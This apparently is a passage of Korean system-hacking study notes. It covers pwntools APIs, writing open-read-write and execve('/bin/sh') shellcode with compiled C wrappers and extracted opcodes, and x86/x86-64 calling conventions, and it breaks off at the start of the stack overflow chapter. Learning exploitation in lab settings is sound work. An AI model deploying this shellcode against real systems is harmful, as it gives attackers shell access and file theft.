0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]
```

> ##### 파일 맵핑이란?
어떤 파일을 메모리에 적재하는 것을 의미한다. 리눅스에서는 ELF를 실행할 때 먼저 ELF의 코드와 여러 데이터를 가상 메모리에 맵핑하고 해당 ELF에 링크된 공유 오브젝트(Shared Object, so)를 추가로 메모리에 맵핑한다. 공유 오브젝트는 자주 사용되는 함수들을 미리 컴파일해둔 것이다. C언어의 printf, scanf 등이 리눅스에서는 libc(library C)에 구현되어 있다. 공유 오브젝트에 이미 구현된 함수를 호출할 때는 매핑된 메모리에 존재하는 함수를 대신 호출한다.

##### gdb/python
gdb를 통해 디버깅할 때 사용자가 직접 입력할 수 없는 값은 파이썬을 통해 입력값을 생성하여 사용해야 한다.

```C
// debugee2.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
	char name[20];
	
	if( argc < 2 ) {
		printf("Give me the argv[2]!\n");
		exit(0);
	}
	
	memset(name, 0, sizeof(name));
	
	printf("argv[1] %s\n", argv[1]);
	read(0, name, sizeof(name)-1);
	
	printf("Name: %s\n", name);
	
	return 0;
}
```

run 명령어의 인자로 $()와 함께 파이썬 코드를 입력하면 값을 전달할 수 있다.

## pwntools 설치
##### pwntools란?
간단한 익스플로잇의 경우 파이썬으로 페이로드를 작성하여 수행할 수 있다. 그러나 익스플로잇이 복잡해질 경우 스크립트를 작성해서 공격을 수행해야 한다. pwntools는 이러한 익스플로잇 스크립트를 작성할 때 자주 사용하는 함수들을 모은 파이썬 모듈이다.

##### pwntools API 사용법
1. process

```python
p = process('대상 바이너리 파일 경로')
```

process 함수는 로컬 바이너리를 대상으로 익스플로잇을 수행한다.

2. remote

```python
p = remote('대상 서버 주소', 포트)
```

remote 함수는 대상 서버의 해당 포트에서 실행 중인 프로세스를 대상으로 익스플로잇을 수행한다.

3. send

```python
p.send('A') # 대상 프로세스에 'A'를 입력
p.sendline('A') # 대상 프로세스에 'A'+'\n'을 입력
p.sendafter('hello','A') # 대상 프로세스가 'hello'를 출력하면, 'A'를 입력
p.sendlineafter('hello','A') # 대상 프로세스가 'hello'를 출력하면, 'A' + '\n'을 입력
```

send는 데이터를 프로세스에 전송하기 위해 사용한다.

4. recv

```python
data = p.recv(1024) # p가 출력하는 데이터를 최대 1024바이트까지 받아서 data에 저장
data = p.recvline() # p가 출력하는 데이터를 개행문자를 만날 때까지 받아서 data에 저장
data = p.recvn(5) # p가 출력하는 데이터를 5바이트만 받아서 data에 저장
data = p.recvuntil('hello') # p가 출력하는 데이터를 'hello'가 출력될 때까지 받아서 data에 저장
data = p.recvall() # p가 출력하는 데이터를 프로세스가 종료될 받아서 data에 저장
```

recv는 프로세스 관련 데이터를 받기 위해 사용한다. recv(n)의 경우 n바이트의 데이터를 받지 않아도 오류가 발생하지 않지만, recvn(n)의 경우 정확하게 n바이트의 데이터를 받지 못하면 계속 기다린다.

5. packing & unpacking
어떤 값을 리틀 엔디언의 바이트 배열로 변경하거나 그 반대의 경우 사용할 수 있는 함수가 pwntools에 정의되어 있다.

--*script*--

```python
from pwn import *

s32 = 0x41424344
s64 = 0x4142434445464748

print(p32(s32))
print(p64(s64))

s32 = "ABCD"
s64 = "ABCDEFGH"

print(hex(u32(s32)))
print(hex(u64(s64)))
```

--*result*--

```python
b'DCBA'
b'HGFEDCBA'
0x44434241
0x4847464544434241
```

6. interactive

```python
p.interactive()
```

익스플로잇의 특정 상황에 직접 입력을 주면서 출력을 확인하고 싶을 때 사용하는 함수이다. 호출하고 나면 터미널로 프로세스에 데이터를 입력하고, 프로세스의 출력을 확인할 수 있다.

7. ELF

```python
e= ELF('대상 바이너리 파일 경로')
puts_plt = e.plt['puts'] # 대상 바이너리 파일에서 puts()의 PLT주소를 찾아서 puts_plt에 저장
read_got = e.got['read'] # 대상 바이너리 파일에서 read()의 GOT주소를 찾아서 read_got에 저장
```

pwntools를 사용해서 ELF 파일의 헤더를 쉽게 참고할 수 있다.

8. context.log

```python
context.log_level = 'error' # 에러만 출력
context.log_level = 'debug' # 대상 프로세스와 익스플로잇간에 오가는 모든 데이터를 화면에 출력
context.log_level = 'info' # 비교적 중요한 정보들만 출력
```

pwntools에는 디버그의 편의를 돕는 로깅 기능이 있으며, 로그 레벨은 context.log_level변수로 조절할 수 있다.

9. context.arch

```python
context.arch = "amd64" # x86-64 아키텍처
context.arch = "i386" # x86 아키텍처
context.arch = "arm" # arm 아키텍처
```

pwntools는 아키텍처 정보를 프로그래머가 지정할 수 있게 하며, 이 값에 따라 몇몇 함수들의 동작이 달라진다.

10. shellcraft

--*script*--

```python
from pwn import *

context.arch = 'amd64' # x86-64 아키텍처
code = shellcraft.sh() # 셸을 실행하는 셸 코드

print(code)
```

--*result*--

```python
    /* push b'/bin///sh\x00' */
    /* Set x14 = 8299904519029482031 = 0x732f2f2f6e69622f */
    mov  x14, #25135
    movk x14, #28265, lsl #16
    movk x14, #12079, lsl #0x20
    movk x14, #29487, lsl #0x30
    mov  x15, #104
    stp x14, x15, [sp, #-16]!
    /* execve(path='sp', argv=0, envp=0) */
    mov  x0, sp
    mov  x1, xzr
    mov  x2, xzr
    /* call execve() */
    mov  x8, #SYS_execve
    svc 0
```

pwntools에는 자주 사용되는 셸 코드들이 저장되어 있어서, 공격에 필요한 셸 코드를 쉽게 꺼내 쓸 수 있다. 그러나 제약 조건이 있는 경우 이를 모두 반영하기 어렵기 때문에 직접 셸 코드를 작성하는 것이 좋다.

11. asm

--*script*--

```python
from pwn import *

context.arch = 'amd64' # x86-64 아키텍처
code = shellcraft.sh() # 셸을 실행하는 셸 코드
code = asm(code) # 셸 코드를 기계어로 어셈블

print(code)
```

--*result*--

```python
b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
```

pwntools는 어셈블 기능을 제공한다.

# Stage 4 : Shellcode
## Shellcode
### 익스플로잇(Exploit)
'부당하게 이용하다'라는 뜻. 시스템에 침투하여 시스템을 악용하는 해킹과 뜻이 일치한다.

### 셸(Shell)
셸이란 운영체제에 명령을 내리기 위해 사용되는 사용자의 인터페이스로, 운영체제의 핵심 기능을 하는 프로그램을 커널(Kernel)이라고 하는 것과 대비된다. 셸을 획득하면 시스템을 제어할 수 있게 되므로 통상적으로 셸 획득을 시스템 해킹의 성공으로 여긴다.

### 셸코드(Shellcode)
익스플로잇을 위해 제작된 어셈블리 코드 조각.
해커가 rip를 자신이 작성한 셸코드로 옮길 수 있으면 원하는 어셈블리 코드를 실행할 수 있으며, 이는 사실상 원하는 모든 명령을 CPU에 내릴 수 있다는 뜻이다. 범용적으로 사용되는 셸코드의 경우 커뮤니티를 통해 공유할 수 있지만 일반적으로 셸코드는 직접 작성해서 사용해야 한다.

## orw 셸코드
### orw(open, read, write) 셸코드 작성
orw 셸코드는 파일을 열고, 읽은 뒤 화면에 출력해주는 셸코드이다.

"/tmp/flag"를 읽는 셸코드를 C언어 의사코드로 표현하면 다음과 같다.

```C
char buf[0x30];
int fd = open("/tmp/flag", RD_ONLY, NULL);

read(fd, buf, 0x30);
write(1, buf, 0x30);
```

orw 셸코드를 작성하기 위해 필요한 `syscall`은 다음과 같다.

| syscall | rax  | arg0 (rdi)            | arg1 (rsi)       | arg2 (rdx)   |
| ------- | ---- | --------------------- | ---------------- | ------------ |
| open    | 0x02 | const char \*filename | int flags        | umode_t mode |
| read    | 0x00 | unsigned int fd       | char \*buf       | size_t count |
| write   | 0x01 | unsigned int fd       | const char \*buf | size_t count |

1. int fd = open(“/tmp/flag”, O_RDONLY, NULL)

| syscall | rax  | arg0 (rdi)            | arg1 (rsi)       | arg2 (rdx)   |
| ------- | ---- | --------------------- | ---------------- | ------------ |
| open    | 0x02 | const char \*filename | int flags        | umode_t mode |

"/tmp/flag"를 읽기 위해서는 우선 이를 메모리에 위치시켜야 한다. 이를 위해 스택에 `0x616c662f706d742f67(/tmp/flag)`를 `push`하고 `rsp`를 `rdi`로 옮긴다. `syscall`에서 O\_RDONLY의 flag는 0이므로 `rsi`는 0으로 설정한다. 여기서 mode 또한 의미가 없기 때문에 `rdx`를 0으로 설정하고 `syscall` open을 위해 `rax`의 값을 2로 설정한다.

```C
// https://code.woboq.org/userspace/glibc/bits/fcntl.h.html#24
/* File access modes for `open' and `fcntl'. */

#define O_RDONLY 0 /* Open read-only. */
#define O_WRONLY 1 /* Open write-only. */
#define O_RDWR 2 /* Open read/write. */
```

```asm
push 0x67
mov rax, 0x616c662f706d742f
push rax
mov rdi, rsp ; rdi = "/tmp/flag"
xor rsi, rsi ; rsi = 0 ; RD_ONLY
xor rdx, rdx ; rdx = 0
mov rax, 2   ; rax = 2 ; syscall_open
syscall      ; open("/tmp/flag", RD_ONLY, NULL)
```

2. read(fd, buf, 0x30)

| syscall | rax  | arg0 (rdi)      | arg1 (rsi) | arg2 (rdx)   |
| ------- | ---- | --------------- | ---------- | ------------ |
| read    | 0x00 | unsigned int fd | char \*buf | size_t count | 

syscall의 반환 값은 `rax`로 저장된다. 따라서 open으로 획득한 "/tmp/flag"의 fd는 `rax`에 저장된다. read의 첫 번째 인자를 이 값으로 설정해야 하므로 `rax`를 `rdi`에 대입합니다. `rsi`는 파일에서 읽은 데이터를 저장할 주소를 가리킨다. 0x30만큼 읽을 것이므로, `rsi`에 `rsp-0x30`을 대입한다. `rdx`는 파일로부터 읽어낼 데이터의 길이인 0x30으로 설정한다. `syscall` read를 위해 `rax`의 값을 0으로 설정한다.

> ##### fd란?
> 파일 서술자(File Descriptor, fd)는 유닉스 계열의 운영체제에서 파일에 접근하는 소프트웨어에 제공하는 가상의 접근 제어자이다. 프로세스마다 고유의 서술자 테이블을 갖고 있으며, 그 안에 여러 파일 서술자를 저장합니다. 서술자 각각은 번호로 구별되는데, 일반적으로 0번은 일반 입력(Standard Input, STDIN), 1번은 일반 출력(Standard Output, STDOUT), 2번은 일반 오류(Standard Error, STDERR)에 할당되어 있으며, 이들은 프로세스를 터미널과 연결한다. 그래서 우리는 키보드 입력을 통해 프로세스에 입력을 전달하고, 출력을 터미널로 받아볼 수 있다.
> 프로세스가 생성된 이후, 위의 open같은 함수를 통해 어떤 파일과 프로세스를 연결하려고 하면, 기본으로 할당된 2번 이후의 번호를 새로운 fd에 차례로 할당한다. 그러면 프로세스는 그 fd를 이용하여 파일에 접근할 수 있다.

```asm
mov rdi, rax  ; rdi = fd
mov rsi, rsp
sub rsi, 0x30 ; rsi = rsp-0x30 ; buf
mov rdx, 0x30 ; rdx = 0x30     ; len
mov rax, 0x0  ; rax = 0        ; syscall_read
syscall       ; read(fd, buf, 0x30)
```

3. write(1, buf, 0x30)

| syscall | rax  | arg0 (rdi)            | arg1 (rsi)       | arg2 (rdx)   |
| ------- | ---- | --------------------- | ---------------- | ------------ |
| write   | 0x01 | unsigned int fd       | const char \*buf | size_t count |

출력은 stdout으로 할 것이므로, `rdi`를 0x1로 설정한다. `rsi`와 `rdx`는 read에서 사용한 값을 그대로 사용한다. `syscall` write를 위해 `rax`의 값을 1로 설정한다.

```asm
mov rdi, 1   ; rdi = 1 ; fd = stdout
mov rax, 0x1 ; rax = 1 ; syscall_write
syscall      ; write(fd, buf, 0x30)
```

### orw 셸코드 컴파일 및 실행
위에서 작성한 셸코드는 아스키로 작성된 어셈블리 코드이다. 이는 기계어로 치환해서 CPU가 이해할 수는 있지만, ELF 파일이 아니기 때문에 리눅스에서 실행은 불가능하다.

##### 컴파일
여기서는 어셈블리 코드를 컴파일하는 방법 중 스켈레톤 코드를 C언어로 작성하고 셸코드를 탑재하는 방법을 사용한다. 스켈레톤 코드는 핵심 내용이 비어있는, 기본 구조만 갖춘 코드를 말한다.

> ##### 스켈레톤 코드 예제
> ```C
> // File name: sh-skeleton.c
> // Compile Option: gcc -o sh-skeleton sh-skeleton.c -masm=intel
> 
> __asm__(
> ".global run_sh\n"
> "run_sh:\n" "Input your shellcode here.\n"
> 
> "Each line of your shellcode should be\n"
> "seperated by '\n'\n"
> "xor rdi, rdi # rdi = 0\n"
> 
> "mov rax, 0x3c # rax = sys_exit\n"
> "syscall # exit(0)");
> 
> void run_sh();
> 
> int main() { run_sh(); }
> ```

```asm
; Name : orw.S

; open
push 0x67
mov rax, 0x616c662f706d742f
push rax
mov rdi, rsp ; rdi = "/tmp/flag"
xor rsi, rsi ; rsi = 0 ; RD_ONLY
xor rdx, rdx ; rdx = 0
mov rax, 2   ; rax = 2 ; syscall_open
syscall      ; open("/tmp/flag", RD_ONLY, NULL)

; read
mov rdi, rax  ; rdi = fd
mov rsi, rsp
sub rsi, 0x30 ; rsi = rsp-0x30 ; buf
mov rdx, 0x30 ; rdx = 0x30     ; len
mov rax, 0x0  ; rax = 0        ; syscall_read
syscall       ; read(fd, buf, 0x30)

; write
mov rdi, 1   ; rdi = 1 ; fd = stdout
mov rax, 0x1 ; rax = 1 ; syscall_write
syscall      ; write(fd, buf, 0x30)
```

```C
// File name : orw.c
// Compile: gcc -o orw orw.c -masm=intel

__asm__(
".global run_sh\n"
"run_sh:\n"

"push 0x67\n"
"mov rax, 0x616c662f706d742f\n"
"push rax\n"
"mov rdi, rsp\n"
"xor rsi, rsi\n"
"xor rdx, rdx\n"
"mov rax, 2\n"
"syscall\n"

"mov rdi, rax\n"
"mov rsi, rsp\n"
"sub rsi, 0x30\n"
"mov rdx, 0x30\n"
"mov rax, 0x0\n"
"syscall\n"

"mov rdi, 1\n"
"mov rax, 0x1\n"
"syscall\n"

"xor rdi, rdi # rdi = 0\n"
"mov rax, 0x3c # rax = sys_exit\n"
"syscall # exit(0)");

void run_sh();

int main() { run_sh(); }
```

위 코드를 컴파일하고 실행하면 다음과 같은 결과가 나온다.

```zsh
╰─$ ./orw                       
flag{this_is_open_read_write_shellcode!}
,��U%
```

### orw 셸코드 디버깅
위에서 셸코드를 실행했을 때 "/tmp/flag"의 내용에 이어서 이상한 문자열이 출력되었다. 그 이유를 알기 위해 디버깅을 통해 원인을 분석한다.

우선 orw를 gdb로 열고, run_sh()함수에 브레이크 포인트를 설정한다. 이후 run 명령어로 run_sh()함수의 시작 부분까지 코드를 실행시킨다.

```gdb
──────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────
 ► 0x5555555545fa <run_sh>       push   0x67
   0x5555555545fc <run_sh+2>     movabs rax, 0x616c662f706d742f
   0x555555554606 <run_sh+12>    push   rax

```

여기서 `rip`가 우리가 작성한 셸코드에 위치한 것을 알 수 있다. 

1. int fd = open(“/tmp/flag”, O_RDONLY, NULL) (첫번째 `syscall`전까지 실행하였을 때)
pwndbg의 플러그인이 자동으로 `syscall`의 인자를 분석해서 open(“/tmp/flag”, O_RDONLY, NULL)가 실행된 것을 알려준다.

```gdb
─────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────
*RAX  0x2
 RBX  0x0
 RCX  0x555555554670 (__libc_csu_init) ◂— push   r15
 RDX  0x0
 RDI  0x7fffffffdf48 ◂— '/tmp/flag'
 RSI  0x0
...
──────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────
   0x555555554606 <run_sh+12>    push   rax
   0x555555554607 <run_sh+13>    mov    rdi, rsp
   0x55555555460a <run_sh+16>    xor    rsi, rsi
   0x55555555460d <run_sh+19>    xor    rdx, rdx
   0x555555554610 <run_sh+22>    mov    rax, 2
 ► 0x555555554617 <run_sh+29>    syscall  <SYS_open>
        file: 0x7fffffffdf48 ◂— '/tmp/flag'
        oflag: 0x0
        vararg: 0x0
...
```

<SYS_open>을 실행하면 "/tmp/flag"의 fd(0x3)가 `rax`에 저장된다.

```gdb
─────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────
*RAX  0x3
 RBX  0x0
*RCX  0x555555554619 (run_sh+31) ◂— mov    rdi, rax
 RDX  0x0
 RDI  0x7fffffffdf48 ◂— '/tmp/flag'
 RSI  0x0
...
──────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────
   0x555555554607 <run_sh+13>    mov    rdi, rsp
   0x55555555460a <run_sh+16>    xor    rsi, rsi
   0x55555555460d <run_sh+19>    xor    rdx, rdx
   0x555555554610 <run_sh+22>    mov    rax, 2
   0x555555554617 <run_sh+29>    syscall 
 ► 0x555555554619 <run_sh+31>    mov    rdi, rax
...
```

2. read(fd, buf, 0x30) (두번째 `syscall`전까지 실행하였을 때)

```gdb
─────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────
*RAX  0x0
 RBX  0x0
 RCX  0x555555554619 (run_sh+31) ◂— mov    rdi, rax
 RDX  0x30
 RDI  0x3
 RSI  0x7fffffffdf18 ◂— 0xf0b5ff
 ...
 ──────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────
   0x555555554619 <run_sh+31>    mov    rdi, rax
   0x55555555461c <run_sh+34>    mov    rsi, rsp
   0x55555555461f <run_sh+37>    sub    rsi, 0x30
   0x555555554623 <run_sh+41>    mov    rdx, 0x30
   0x55555555462a <run_sh+48>    mov    rax, 0
 ► 0x555555554631 <run_sh+55>    syscall  <SYS_read>
        fd: 0x3 (/tmp/flag)
        buf: 0x7fffffffdf18 ◂— 0xf0b5ff
        nbytes: 0x30
...
```

"/tmp/flag"의 fd(0x3)에서 데이터를 0x30바이트만큼 읽어서 0x7fffffffdf18에 저장한다. <SYS_read>을 실행한 뒤 실행 결과를 x/s를 통해 확인한다.

```gdb
pwndbg> x/s 0x7fffffffdf18
0x7fffffffdf18:	"flag{this_is_open_read_write_shellcode!}\nFUUUU"
```

0x7fffffffdf18에 "/tmp/flag"의 내용이 저장된 것을 확인할 수 있다.

3. write(1, buf, 0x30) (세번째 `syscall`전까지 실행하였을 때)

```gdb
─────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────
*RAX  0x1
 RBX  0x0
 RCX  0x555555554633 (run_sh+57) ◂— mov    rdi, 1
 RDX  0x30
 RDI  0x1
 RSI  0x7fffffffdf18 ◂— 'flag{this_is_open_read_write_shellcode!}\nFUUUU'
...
──────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────
   0x555555554623 <run_sh+41>    mov    rdx, 0x30
   0x55555555462a <run_sh+48>    mov    rax, 0
   0x555555554631 <run_sh+55>    syscall 
   0x555555554633 <run_sh+57>    mov    rdi, 1
   0x55555555463a <run_sh+64>    mov    rax, 1
 ► 0x555555554641 <run_sh+71>    syscall  <SYS_write>
        fd: 0x1 (/dev/pts/0)
        buf: 0x7fffffffdf18 ◂— 'flag{this_is_open_read_write_shellcode!}\nFUUUU'
        n: 0x30
...
```

0x7fffffffdf18에서 0x30(48)바이트를 출력한다. 여기서도 "/tmp/flag"의 내용 뒤에 알 수 없는 문자열이 출력되었다. 이는 초기화되지 않은 메모리 영역을 사용했기 때문에 발생하는 문제이다.

> ##### 초기화 되지 않은 메모리 사용(Use of Uninitialized Memory)
> 스택은 다양한 함수들이 공유하는 메모리 자원이다. 그러나 각 함수들이 스택 프레임을 할당하고 해제할 때 그 내용을 초기화하는 것이 아니라 단순히 `rsp`와 `rbp`를 새로 호출한 함수의 것으로 이동시킨다. 따라서 어떤 함수가 스택 프레임을 해제하고 다른 함수가 그 위에 스택 프레임을 할당하면 이전 스택 프레임의 값이 남아있게 된다. 이를 쓰레기 값(garbage data)라고 한다.

이전과 같이 파일을 읽어 스택에 저장하고 이를 조회해본다.

```gdb
pwndbg> x/6gx 0x7fffffffdf18
0x7fffffffdf18:	0x6968747b67616c66	0x65706f5f73695f73
0x7fffffffdf28:	0x775f646165725f6e	0x6568735f65746972
0x7fffffffdf38:	0x7d2165646f636c6c	0x000055555555460a
```

총 48바이트 중 앞의 40바이트만이 우리가 저장한 파일의 데이터이고 나머지는 쓰레기 값이다. 이것이 나중에 이상한 문자열로 출력되는 것이다.
중요한 값을 유출해 내는 것을 메모리 릭(Memory Leak)이라고 부르며 다양한 보호기법들을 무력화하는 핵심 역할을 한다.

## execve 셸코드
execve 셸코드는 임의의 프로그램을 실행하는 셸코드이며 이를 이용하면 서버의 셸을 획득할 수 있다. 일반적으로 셸코드라고 하면 이를 의미하는 경우가 많다.
여기서 사용하는 Ubuntu 18.04에도 "/bin/sh"가 존재하므로 이를 실행하는 execve 셸코드를 작성해본다.

![](https://kr.object.ncloudstorage.com/dreamhack-content/page/c572f2f71b18e75d8fdc4ef185deebd184111decb487a7423131ab6a906243b9.png)

### execve 셸코드 작성
execve 셸코드는 execve 시스템 콜만으로 구성된다.

| syscall | rax  | arg0 (rdi)            | arg1 (rsi)                | arg2 (rdx)                |
| ------- | ---- | --------------------- | ------------------------- | ------------------------- |
| execve  | 0x3b | const char \*filename | const char \*const \*argv | const char \*const \*envp |

여기서 argv는 실행파일에 넘겨줄 인자, envp는 환경변수이다. sh만 실행하면 되므로 다른 값들은 전부 null로 설정한다. 리눅스에서는 기본 실행 프로그램들이 "/bin/" 디렉토리에 저장되어 있으며, sh도 여기에 저장되어 있다.

```asm
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp  ; rdi = "/bin/sh"
xor rsi, rsi  ; rsi = NULL
xor rdx, rdx  ; rdx = NULL
mov rax, 0x3b ; rax = sys_execve
syscall       ; execve("/bin/sh", null, null)
```

"/bin/sh"를 실행하기 위해서 스택에 `0x68732f6e69622f(/bin/sh)`를 `push`하고 `rsp`를 `rdi`로 옮긴다. execve의 arg0, arf1은 NULL이므로 `rsi`와 `rdx`를 0으로 하고 `syscall` execve를 위해 `rax`의 값을 0x3b로 설정한다.

### execve 셸코드 컴파일 및 실행
##### 컴파일

```C
// File name: execve.c
// Compile Option: gcc -o execve execve.c -masm=intel

__asm__(
".global run_sh\n"
"run_sh:\n"

"mov rax, 0x68732f6e69622f\n"
"push rax\n"
"mov rdi, rsp\n"
"xor rsi, rsi\n"
"xor rdx, rdx\n"
"mov rax, 0x3b\n"
"syscall\n"

"xor rdi, rdi"
"mov rax, 0x3c"
"syscall");

void run_sh();

int main() { run_sh(); }
```

이를 컴파일하여 실행해보면 성공적으로 sh가 실행되는 것을 알 수 있다.

### objdump 를 이용한 shellcode 추출
다음과 같은 과정을 통해 작성한 셸코드를 바이트 코드(byte code, opcode)로 추출할 수 있다.

```asm
; File name: shellcode.asm

section .text
global _start
_start:
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
xor edx, edx
mov al, 0xb
int 0x80
```

```zsh
╭─kakunge@ubuntu ~/Documents/stage4 
╰─$ nasm -f elf shellcode.asm
╭─kakunge@ubuntu ~/Documents/stage4 
╰─$ objdump -d shellcode.o

shellcode.o:     file format elf32-i386


Disassembly of section .text:

00000000 <_start>:
   0:	31 c0                	xor    %eax,%eax
   2:	50                   	push   %eax
   3:	68 2f 2f 73 68       	push   $0x68732f2f
   8:	68 2f 62 69 6e       	push   $0x6e69622f
   d:	89 e3                	mov    %esp,%ebx
   f:	31 c9                	xor    %ecx,%ecx
  11:	31 d2                	xor    %edx,%edx
  13:	b0 0b                	mov    $0xb,%al
  15:	cd 80                	int    $0x80
╭─kakunge@ubuntu ~/Documents/stage4 
╰─$ objcopy --dump-section .text=shellcode.bin shellcode.o
╭─kakunge@ubuntu ~/Documents/stage4 
╰─$ xxd shellcode.bin 
00000000: 31c0 5068 2f2f 7368 682f 6269 6e89 e331  1.Ph//shh/bin..1
00000010: c931 d2b0 0bcd 80                        .1.....
```

# Stage 5 : Stack Buffer Overflow
## Calling Convention
### 함수 호출 규약
함수의 호출 및 반환에 대한 약속.
한 함수에서 다른 함수를 호출하면 프로그램의 실행 흐름은 다른 함수로 이동함
-> 호출한 함수가 반환하면 원래의 함수로 돌아와서 기존의 실행 흐름을 이어나감
-> 함수를 호출할 때는 반환된 이후를 위해 호출자(Caller)의 상태(Stack frame) 및 반환 주소(Return Address)를 저장해야 하고 호출자는 피호출자(Callee)가 요구하는 인자를 전달해줘야 하며, 피호출자의 실행이 종료될 때는 반환 값을 전달받아야 함

일반적으로 고수준 언어로 작성된 코드를 컴파일할 때는 함수 호출 규약을 따로 명시하지 않아도 컴파일러가 자동으로 선택한다. 그러나 어셈블리 코드를 작성하거나 읽기 위해서는 함수 호출 규약을 알아야 한다.

### 함수 호출 규약의 종류
컴파일러는 CPU 아키텍처에 적합한 함수 호출 규약을 사용한다. 또한 같은 아키텍처에서도 컴파일러에 따라 사용하는 함수 호출 규약이 달라진다.

> ##### 다양한 함수 호출 규약
> x86
> - cdecl
> - stdcall
> - fastcall
> - thiscall
> 
> x86-64
> - System V AMD64 ABI의 Calling Convention
> - MS ABI의 Calling Convention

### cdecl
x86 아키텍처는 레지스터의 수가 적기 때문에 스택을 사용해서 인자를 전달하고 인자를 전달하기 위해 사용한 스택을 호출자가 정리한다.스택을 통해 인자를 전달할 때는, 마지막 인자부터 첫 번째 인자까지 거꾸로 스택에 push한다.
다음 코드를 어셈블리로 컴파일하여 확인할 수 있다.

```C
// Name: cdecl.c
// Compile: gcc -fno-asynchronous-unwind-tables -nostdlib -masm=intel -fomit-frame-pointer -S cdecl.c -w -m32 -fno-pic -O0

void __attribute__((cdecl)) callee(int a1, int a2)
{ // cdecl로 호출
}

void caller()
{
callee(1, 2);
}
```

```asm
; Name: cdecl.s
	.file	"cdecl.c"
	.intel_syntax noprefix
	.text
	.globl	callee
	.type	callee, @function
callee:
	nop
	ret ; 스택을 정리하지 않고 리턴
	.size	callee, .-callee
	.globl	caller
	.type	caller, @function
caller:
	push	2 ; 2를 스택에 저장하여 callee의 인자로 전달
	push	1 ; 1을 스택에 저장하여 callee의 인자로 전달
	call	callee
	add	esp, 8 스택 정리 (push를 2번하였기 때문에 esp가 8byte만큼 증가됨)
	nop
	ret
	.size	caller, .-caller
	.ident	"GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0"
	.section	.note.GNU-stack,"",@progbits

```

### SYSV
리눅스는 SYSTEM V(SYSV) Application Binary Interface(ABI)를 기반으로 만들어졌다. SYSV ABI는 ELF 포맷, 링킹 방법, 함수 호출 규약 등의 내용을 담고 있다. file 명령어를 사용해서 바이너리 정보에 SYSV가 있는 것을 확인할 수 있다.

```zsh
$ file /bin/ls | grep SYSV
/bin/ls: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9567f9a28e66f4d7ec4baf31cfbf68d0410f0ae6, stripped
```

SYSV의 함수 호출 규약은 다음과 같은 특징을 갖는다.
1. 6개의 인자를 `RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9`에 순서대로 저장하여 전달한다. 더 많은 인자를 사용해야 할 때는 스택을 추가로 이용한다.    
2. Caller에서 인자 전달에 사용된 스택을 정리한다.
3. 함수의 반환 값은 `RAX`로 전달한다.

```C
// Name: sysv.c
// Compile: gcc -fno-asynchronous-unwind-tables -masm=intel -fno-omit-frame-pointer -S sysv.c -fno-pic -O0

ull callee(ull a1, int a2, int a3, int a4, int a5, int a6, int a7)
{
	ull ret = a1 + a2 + a3 + a4 + a5 + a6 + a7;

	return ret;
}

void caller()
{
	callee(123456789123456789, 2, 3, 4, 5, 6, 7);
}

int main()
{
	caller();
}
```

위의 코드를 컴파일하여 분석한다.

##### 1. 인자 전달

```gdb
──────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────
 ► 0x555555554652 <caller>       push   rbp
   0x555555554653 <caller+1>     mov    rbp, rsp
   0x555555554656 <caller+4>     push   7
   0x555555554658 <caller+6>     mov    r9d, 6
   0x55555555465e <caller+12>    mov    r8d, 5
   0x555555554664 <caller+18>    mov    ecx, 4
   0x555555554669 <caller+23>    mov    edx, 3
   0x55555555466e <caller+28>    mov    esi, 2
   0x555555554673 <caller+33>    movabs rdi, 0x1b69b4bacd05f15
   0x55555555467d <caller+43>    call   callee                <callee>
 
   0x555555554682 <caller+48>    add    rsp, 8
```

gdb로 sysv를 로드하여 caller까지 실행시켜보면 <caller+6>부터 <caller+33>까지 6개의 인자를 각각의 레지스터에 설정하고 <caller+4>에서는 7번째 인자인 7을 스택으로 전달하는 것을 알 수 있다.

```gdb
─────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────
 RAX  0x0
 RBX  0x0
*RCX  0x4
*RDX  0x3
*RDI  0x1b69b4bacd05f15
*RSI  0x2
*R8   0x5
*R9   0x6
 R10  0x0
 R11  0x1
 R12  0x5555555544f0 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffe010 ◂— 0x1
 R14  0x0
 R15  0x0
*RBP  0x7fffffffdf20 —▸ 0x7fffffffdf30 —▸ 0x5555555546a0 (__libc_csu_init) ◂— push   r15
*RSP  0x7fffffffdf18 ◂— 0x7
*RIP  0x55555555467d (caller+43) ◂— call   0x5555555545fa
```

callee함수 전까지 실행시켜보면 callee(123456789123456789, 2, 3, 4, 5, 6, 7)를 호출한 결과로 인자들이 순서대로
`rdi`, `rdi`, `rdx`, `rcx`, `r8`, `r9`에 저장되고 `rsp`에 7이 저장된 것을 확인할 수 있다.

##### 2. 반환 주소 저장

```gdb
pwndbg> x/4gx $rsp
0x7fffffffdf10:	0x0000555555554682	0x0000000000000007
0x7fffffffdf20:	0x00007fffffffdf30	0x0000555555554697
pwndbg> x/10i 0x555555554682-5
   0x55555555467d <caller+43>:	call   0x5555555545fa <callee>
   0x555555554682 <caller+48>:	add    rsp,0x8
```

si 명령어로 call을 실행하고 스택을 확인해보면 반환 주소로 callee 호출 다음 명령어의 주소인 0x555555554682가 저장된 것을 확인할 수 있다.

##### 3. 스택 프레임 저장

```gdb
pwndbg> x/5i $rip
